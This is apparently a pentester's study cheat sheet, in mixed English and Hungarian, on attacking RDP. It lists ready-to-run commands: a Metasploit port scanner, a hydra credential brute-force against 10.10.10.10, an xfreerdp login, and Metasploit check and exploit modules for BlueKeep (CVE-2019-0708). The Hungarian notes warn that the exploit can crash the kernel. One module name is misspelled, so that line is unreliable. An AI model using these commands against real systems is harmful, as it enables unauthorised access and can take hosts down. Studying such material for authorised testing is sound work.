# rdp
can be use arbitrary port!!!!
## identify rdp service on a random port
### metasploit
use auxiliary/scanner/rdp/rdp_scanner
## bruteforcing credentials
hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -s 1234
## rdp connect with random port
xfreerdp /u:administrator /p:pass123 /v:10.10.10.10:3333
## exploiting CVE-2019-0708 (Blue Keep)
### affected OSs
XP, Vista, Win7, Windows Server 2008, Windows Server 2008 R2
### check if system is vulnerable
msfconsole> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
### exploitation
msfconsole> use exploit/windows/rdp/cve_2019_0708_blekeep_rce  
show targets  
* ki kell valasztani, a targetet!!!
### other info
nagyon sok poc van hozza  
elcrash-elhet a kernel, ha nem tetszik neki a kod  
csak x64-en mukodik, x86-on nem  
veszelyes exploit (kernel exploit), ne nagyon hasznaljuk, vizsgan, meg elesben se
a masik oldalrol viszont nagyon fasza es nagyon hasznos exploit!!!!
csak nagyon ovatosnak kell lenni vele
